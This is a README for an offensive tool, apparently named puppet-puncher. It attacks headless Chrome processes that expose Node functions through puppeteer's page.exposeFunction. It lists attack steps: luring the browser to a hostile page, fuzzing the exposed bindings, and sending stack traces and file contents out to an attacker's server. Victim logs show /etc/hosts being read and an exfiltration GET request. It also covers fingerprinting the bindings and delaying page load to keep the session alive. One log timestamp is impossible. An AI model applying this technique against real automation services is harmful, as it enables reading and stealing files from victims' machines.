# puppet-puncher

Attack headless chrome browsers which use `page.exposeFunction` in the `puppeteer` library.

## How to use

* Host your puppet-puncher webpage and an endpoint to exfiltrate data to
* Entice a headless chrome to visit your page
* Stack trace exfiltrated to your server
* Use stack trace to come up with targeted payload and host it
* Entice the headless chrome to visit your new page
* Profit

## Example vulnerable puppeteer

The code in `readfile.js` is an example vulnerable puppeteer app which exposes `fs.readFile` to any page it browses to. When it browses to our `puppet-puncher.html` page, the function is discovered.

Logs of the puppeteer (victim) process (`PAGE SAYS` denotes log messages from `puppet-puncher.html`):

```
$ node /app/puppet-puncher/readfile.js
PAGE SAYS Starting puppet-puncher
PAGE SAYS 'window.webkitStorageInfo' is deprecated. Please use 'navigator.webkitTemporaryStorage' or 'navigator.webkitPersistentStorage' instead.
PAGE SAYS Found punchable readfile
PAGE SAYS PUNCHED readfile! STACK: TypeError: Cannot convert object to primitive value
    at isUint32 (internal/validators.js:14:27)
    at Object.readFile (fs.js:287:22)
    at Promise (/app/puppet-puncher/readfile.js:15:10)
    at new Promise (<anonymous>)
    at page.exposeFunction (/app/puppet-puncher/readfile.js:14:12)
    at Page._onBindingCalled (/app/puppet-puncher/node_modules/puppeteer/lib/Page.js:542:56)
    at CDPSession.Page.client.on.event (/app/puppet-puncher/node_modules/puppeteer/lib/Page.js:136:54)
    at CDPSession.emit (events.js:197:13)
    at CDPSession._onMessage (/app/puppet-puncher/node_modules/puppeteer/lib/Connection.js:200:12)
    at Connection._onMessage (/app/puppet-puncher/node_modules/puppeteer/lib/Connection.js:112:17)
PAGE SAYS 127.0.0.1     localhost
...
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The full stack trace is exfiltrated to our server via an HTTP GET request (truncated below):

```
$ http-server
Starting up http-server, serving ./
Available on:
  http://127.0.0.1:8000
Hit CTRL-C to stop the server
[Sun Apr 99 3019 29:29:49 GMT+0100 (GMT+01:00)] "GET /?x=WyJyZWFkZmlsZSIsIlR5cGVFcnJvcjogQ2Fubm90IGNvbnZlcnQgb2JqZWN0IHRvIHByaW1pdGl2ZSB2YWx1ZVxuICAgIGF...
```

The error in this case occurs when `fs.readFile` checks if the file path is a file descriptor.
The `x|0` part of the internal function `isUint32` works as follows:

```
> 1|0
1
> "hello"|0
0
> null|0
0
> ({})|0
0
> ({toString: () => console.log("HI")})|0
HI
0
> ({toString: null})|0
Uncaught TypeError: Cannot convert object to primitive value
```

We don't really care about the error though. From reading the stack trace, we know that the page contains a function exposed as `readfile` which passes the first argument to `fs.readFile` in the puppeteer process. We can then craft a page which abuses this knowledge to exfiltrate arbitrary files.


## Finding functions to attack

The `page.exposeFunction` puppeteer function creates a function with the following code. I'm not yet sure what wizardry sets `bindingName`, but we can search `window` for a function `f` where `f.toString()` looks like:

```javascript
(...args) => {
        const me = window[bindingName];
        let callbacks = me['callbacks'];
        if (!callbacks) {
          callbacks = new Map();
          me['callbacks'] = callbacks;
        }
        const seq = (me['lastSeq'] || 0) + 1;
        me['lastSeq'] = seq;
        const promise = new Promise((resolve, reject) => callbacks.set(seq, {resolve, reject}));
        binding(JSON.stringify({name: bindingName, seq, args}));
        return promise;
      }
```

## Getting information about the puppeteer process

Since you don't know what the function does, your best bet for getting a clue as to its purpose is to fuzz it with some junk data that will make it throw an exception with a juicy stack trace! An important limitation is that the arguments your page sends are passed to and from puppeteer via JSON roundtrip.

Exfiltration method is entirely up to you.


## What's with the <q>s?

This is to delay the `domContentLoaded` event. In this example, the puppeteer is `await`ing it. If we make it pause here, we have longer to play around before the page is killed. This only really important in the case where the function doesn't throw an error, or takes a long time to execute.

It turns out that, at least for me, `<q>` takes a longer time to load than most other elements. Odd!

It's entirely optional. You can also maybe delay the HTTP response stream.
